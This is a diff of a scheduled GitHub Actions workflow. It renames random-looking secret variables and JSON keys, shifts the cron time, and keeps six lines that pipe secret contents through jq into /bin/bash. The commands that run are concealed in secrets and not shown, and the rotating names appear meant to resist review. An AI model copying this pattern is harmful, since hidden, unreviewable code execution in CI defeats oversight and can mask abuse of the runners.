@@ -3,22 +3,20 @@ name: shilindongxing
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 2/6 * * *'
-
-jobs:  # 26770
+    - cron: '5 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shilindongxing
         env:
-          kx0: ${{ secrets.kx0 }}
+          r637: ${{ secrets.r637 }}
         run: |
-          echo $kx0 | jq -r .owviw56443 | /bin/bash
-          echo $g2216 | jq -r .s1 | /bin/bash
-          echo $dsfj203 | jq -r .aij8 | /bin/bash
-          echo $a1926 | jq -r .tal8851 | /bin/bash
-          echo $hkbd73 | jq -r .c636 | /bin/bash
-          echo $yr74 | jq -r .uiqr61104 | /bin/bash
+          echo $r637 | jq -r .hxs0878 | /bin/bash
+          echo $gty7196 | jq -r .fqiz8 | /bin/bash
+          echo $iglrf91402 | jq -r .cf268 | /bin/bash
+          echo $v3953 | jq -r .sbhzv4065 | /bin/bash
+          echo $wzg270 | jq -r .uwosn65 | /bin/bash
+          echo $t64685 | jq -r .j92 | /bin/bash
 
